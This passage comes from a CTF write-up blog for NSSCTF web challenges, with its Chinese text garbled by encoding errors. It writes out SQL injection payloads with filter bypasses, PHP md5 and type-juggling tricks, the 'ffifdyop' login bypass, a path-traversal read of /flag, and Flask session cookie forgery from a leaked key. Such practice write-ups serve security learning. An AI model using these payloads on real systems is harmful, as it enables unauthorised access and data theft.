[5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾å­—æ®µæ•°æ—¶ï¼Œæç¤ºè¯·å‹¿éæ³•æ“ä½œ</p><img src="94fafbe1a6e373bab66ac9d3f430d7fb.png" alt="94fafbe1a6e373bab66ac9d3f430d7fb.png" /><p>è¯´æ˜ç©ºæ ¼å‡ºç°è¿‡æ»¤ï¼Œå¯ä»¥ç”¨&#x2F;**&#x2F;ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1%27/**/order/**/by/**/4%23</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure><p>æ²’æœ‰4å­—æ®µæ•°ä¸º3</p> <img src="a4b2b77c2d1027399b7b6be442d414ad.png" alt="a4b2b77c2d1027399b7b6be442d414ad.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><img src="a829ef4366104e99100478c564649d4f.png" alt="a829ef4366104e99100478c564649d4f.png" /><p>çœ‹ä¾†é‚„æœ‰è¿‡æ»¤ &#x3D; </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=datbase()%23</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨likeä»£æ›¿&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like(database())%23</span><br></pre></td></tr></table></figure><img src="0541955768dbadf0f5138e3a13144d49.png" alt="0541955768dbadf0f5138e3a13144d49.png" /><p>æŸ¥çœ‹LTLT_flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like(%22LTLT_flag%22)%23</span><br></pre></td></tr></table></figure><img src="83ca98ed1f3c834abef68f4562d61d30.png" alt="83ca98ed1f3c834abef68f4562d61d30.png" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="2370baa6b1f4efac7147c371cfe695f1.png" alt="2370baa6b1f4efac7147c371cfe695f1.png" /><p>flag1 : NSSCTF{cf9ffc45-7a1</p><p>strlen(string)æœ‰20å€‹å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,group_concat(id,flag),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><p>åœ¨group_concat åŠ ä¸€å€‹mid(group_concat(column_name), èµ·å§‹ä½ç½®, é•¿åº¦) </p><p>mid(â€¦â€¦..,21,40)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1%27union/**/select/**/1,mid(group_concat(id,flag),21,40),3/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure><img src="40f96c8eb3a9f9156c397332ae075bcc.png" alt="40f96c8eb3a9f9156c397332ae075bcc.png" /><p>flag2 : 7-4e7a-b6d8-10ff2ead</p><p>41 - 60</p><img src="86120c33fa0c7fbcc9dfe0342d825306.png" alt="86120c33fa0c7fbcc9dfe0342d825306.png" /><p>db58}</p><p>flag : NSSCTF{cf9ffc45-7a17-4e7a-b6d8-10ff2eaddb58}</p><br/><h2 id="17-babyphp"><a href="#17-babyphp" class="headerlink" title="17.babyphp"></a>17.babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;yee&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nop&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;go on&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;let&#x27;s get some php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li>post ä¸€å€‹ aä¸å¯ä»¥æ˜¯æ•¸å­— , ä½†æ˜¯ä¸€å€‹æ•¸å­—</li><li>post å…©å€‹ b1 b2 md5å€¼ä¸€æ¨£</li><li>post å…©å€‹ c1 c2å…©å­—ç¬¦ä¸²ä¸ç›¸ç­‰, md5å€¼ä¸€æ¨£</li></ol><p>aå¯ä»¥ç”¨æ•¸çµ„ç¹é a[]&#x3D;1</p><p>b1 b2 éƒ½å¯ä»¥ç”¨æ•¸çµ„ç¹é æ–¹æ³•äºŒï¼šä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼ˆæ›´ç®€å•ï¼‰</p><br/><p>å¦‚æœPHPç‰ˆæœ¬å…è®¸ï¼Œå¯ä»¥å°è¯•ï¼š</p><p>b1[]&#x3D;1&amp;b2[]&#x3D;2  &#x2F;&#x2F; NULL &#x3D;&#x3D;&#x3D; NULL</p><p>c1 , c2: md5ç›¸åŒå€¼æ–‡ä»¶é¸ä¸€å€‹ (0eç¹é) &#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="55bf9b54aede8a60262900db6606f8d2.png" alt="55bf9b54aede8a60262900db6606f8d2.png" /><h2 id="18-å¥‡å¦™çš„MD5"><a href="#18-å¥‡å¦™çš„MD5" class="headerlink" title="18.å¥‡å¦™çš„MD5"></a>18.å¥‡å¦™çš„MD5</h2><h3 id="å…©ç¥å¥‡çš„å­—ç¬¦ä¸²"><a href="#å…©ç¥å¥‡çš„å­—ç¬¦ä¸²" class="headerlink" title="å…©ç¥å¥‡çš„å­—ç¬¦ä¸²"></a>å…©ç¥å¥‡çš„å­—ç¬¦ä¸²</h3><p><strong>0e215962017</strong> md5åŠ å¯†å¾Œ : <strong>0e291242476940776845150308577824</strong></p><p><strong>ffifdyop</strong> md5åŠ å¯†å¾Œ:** 276f722736c95d99e921722cf9ed621c** , from hex å¾Œæ˜¯** â€˜orâ€™6Ã‰]Â™Ã©!r,Ã¹Ã­b**</p><p>ffifdyopæ˜¯è¬èƒ½å¯†ç¢¼</p><p>æŠ“å€‹åŒ…çœ‹çœ‹</p><img src="b37282e967f6ce91bd65b7ffe174a690.png" alt="b37282e967f6ce91bd65b7ffe174a690.png" /><br/><p>hint: select * from â€˜adminâ€™ where password&#x3D;md5($pass,true)</p><p>è¦å¡«å¯«è¬èƒ½å¯†ç¢¼: ffifdyop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$x= $GET[&#x27;x&#x27;];</span><br><span class="line">$y = $_GET[&#x27;y&#x27;];</span><br><span class="line">if($x != $y &amp;&amp; md5($x) == md5($y))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>(0eç¹é)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s878926199a  -&gt;0e545993274517709034328855841020</span><br><span class="line">s155964671a  -&gt;0e342768416822451524974117254469</span><br></pre></td></tr></table></figure><img src="2700d2660e4a04d9c498fa1773717036.png" alt="2700d2660e4a04d9c498fa1773717036.png" /><p>æ•°ç»„ç»•è¿‡</p><img src="128ea3f616632eba411990eb56b74c70.png" alt="128ea3f616632eba411990eb56b74c70.png" /><h2 id="19-é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨"><a href="#19-é«˜äº®ä¸»é¢˜-åˆ’æ‰-èƒŒæ™¯æŸ¥çœ‹å™¨" class="headerlink" title="19.é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨"></a>19.é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–‡ä»¶åŒ…å«æ¼æ´æ¼”ç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–å¹¶åŒ…å«ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No file specified.&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>dirsearchä¸€ä¸‹</p><img src="51ce037052d7772b9b20fbe8a7cd6b26.png" alt="51ce037052d7772b9b20fbe8a7cd6b26.png" /><p>[02:08:34] 200 -    11B - &#x2F;flag , è©¦ä¸€è©¦æœ‰äº†ä¸€å€‹æç¤º</p><img src="8a6dc14880c549d4f517c4932b726e3e.png" alt="8a6dc14880c549d4f517c4932b726e3e.png" /><p>flagåœ¨æ ¹ç›®éŒ„ä¸‹ </p><p> åœ¨urlä¸‹ä¸èƒ½&#x2F;..&#x2F;..&#x2F;..&#x2F;.. , ä»£ç¢¼æœ‰èªªæ˜  ,  é‚£BPæŠ“ä¸€ä¸‹åŒ…</p><img src="02dfb9ca469befd3b4bcca77bfe9ece6.png" alt="02dfb9ca469befd3b4bcca77bfe9ece6.png" /><p>åœ¨åˆ‡æ›ä¸»é¡Œæ™‚ç™¼ç¾æœ‰POST å‚³åƒ theme &#x3D; </p><p>è©¦ä¸€è©¦&#x2F;flag</p><img src="47b31af9751041bbc61d65e8df30f718.png" alt="47b31af9751041bbc61d65e8df30f718.png" /><p>ä¸åœ¨é€™ç›®éŒ„ä¸‹, ..ä¸€ä¸‹</p><img src="4be84a4293e0bed53f122823feda714f.png" alt="4be84a4293e0bed53f122823feda714f.png" /><p>å†..&#x2F;..&#x2F;â€¦â€¦â€¦â€¦â€¦â€¦.</p><img src="cee00419105f25959368de46b1b75db6.png" alt="cee00419105f25959368de46b1b75db6.png" /><p>theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag æˆåŠŸæ‹¿åˆ°flag</p><h2 id="20-flask-jwt"><a href="#20-flask-jwt" class="headerlink" title="20.flask?jwt?"></a>20.flask?jwt?</h2><img src="f373c598d4c19eb78f3a03e17c9f1723.png" alt="f373c598d4c19eb78f3a03e17c9f1723.png" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>å¿˜è®°å¯†ç <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/password.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/jquery-1.11.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> height=$(<span class="variable language_">document</span>).<span class="title function_">height</span>();</span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.main&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;height&#x27;</span>,height);</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 919px;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main0&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formBox&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ç™»å½•å¯†ç é‡ç½®<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;mainCol firLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>èº«ä»½éªŒè¯<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="symbol">&amp;gt;</span>ç™»å½•å¯†ç é‡ç½®<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;lastLi&quot;</span>&gt;</span><span class="symbol">&amp;gt;</span>é‡ç½®å®Œæˆ<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/line.png&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;itembox&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span>&gt;</span>é‚®ç®±å·<span class="symbol">&amp;nbsp;</span>:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥æ³¨å†Œé‚®ç®±å·&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btnBox&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>å‘é€é‡ç½®å¯†ç é‚®ä»¶<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer0&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_l&quot;</span>&gt;</span>ä½¿ç”¨æ¡æ¬¾ | éšç§ä¿æŠ¤<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_r&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>Â© C4skg<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>æœ‰é—®é¢˜è¯·å‘é€é‚®ä»¶è‡³ adm1n@flag.com <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- secretkey: th3f1askisfunny --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="sessionå½é€ "><a href="#sessionå½é€ " class="headerlink" title="sessionå½é€ "></a>sessionå½é€ </h3><p>th3f1askisfunny , é€™å€‹å¯èƒ½æ˜¯sessionå½é€  </p><p>æ³¨å†Šä¸€ä¸‹ , 12345 12345 </p><img src="b01798a1df1520a7381ab32a4cfe6b57.png" alt="b01798a1df1520a7381ab32a4cfe6b57.png" /><img src="86e46a2828e01e9a7aafc13852a79603.png" alt="86e46a2828e01e9a7aafc13852a79603.png" /><p>session &#x3D; .eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM</p><p>ä¸‹è¼‰: <a href="https://">https://github.com/noraj/flask-session-cookie-manager</a></p><p>æˆ‘è¦ç”¨Ubuntu æ‰å¯ä»¥conda (web_env) </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &quot;.eJwlzjEOwzAIAMC_MHcA45iQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjisLcamKZJCqMzdJMdcBiNjriJ9jhvQq1OvSeqZNTNDKCWKptXqohWdGV3QGuOK6BQR1I1akhZaoYyomqjqptrJl4Q7cp15_DcNvj_Owi_0.aOiRBw.bgLfdWhJg0-721Y0mDQlFm8j0gM&quot; -s &quot;th3f1askisfunny&quot;</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;&#125;</span><br></pre></td></tr></table></figure><p>åˆç†çŒœæ¸¬id &#x3D; 1 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> python3 flask_session_cookie_manager3.py encode -s &quot;th3f1</span><br><span class="line">askisfunny&quot; -t &quot; &#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;a9706a25a3a9e77e7109334a7e6c563030e8774c67e60bf414fc19beefceed71e7df1caf8b79fd</span><br><span class="line">4330b70a230800b1ddd14a12e19f0af076dffc099ba9941b5e&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line"></span><br><span class="line">.eJwlzjEOwzAIAMC_MHeAYJuQz0RgQO2aNFPVvzdS15vuA3sdeT5hex9XPmB_BWxgKjhs6camKZJCqMzNJMfsg5ExV5E2xw3o1ajVJPXMmpkhlBJF02p10YrGjC5oC-OK6BQR1IyWJC20QhlRNVHVTbWR94Q7cp15_DcE3x_Ovy_z.aOiklg.8mo1XmLqTIj-6RuRxvgu7__4Y-g</span><br></pre></td></tr></table></figure><img src="5e432dcdae883b55ace167cf0a4183b7.png" alt="5e432dcdae883b55ace167cf0a4183b7.png" /><img src="e7ebc9cb9ac2e7adfe317a16803a861d.png" alt="e7ebc9cb9ac2e7adfe317a16803a861d.png" /><img src="ab72b2d9bf4d126f3f38646240947868.png" alt="ab72b2d9bf4d126f3f38646240947868.png" /><h2 id="21-ez-SSTI"><a href="#21-ez-SSTI" class="headerlink" title="21.ez_SSTI"></a>21.ez_SSTI</h2><p>åœ¨kaliå®‰è£fenjing :</p><p>pip install fenjing -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><img src="96f12fb4d30448b04b349f1049b740c3.png" alt="96f12fb4d30448b04b349f1049b740c3.png" /><p>è¼¸å…¥åƒæ•¸é–‹å§‹çˆ†ç 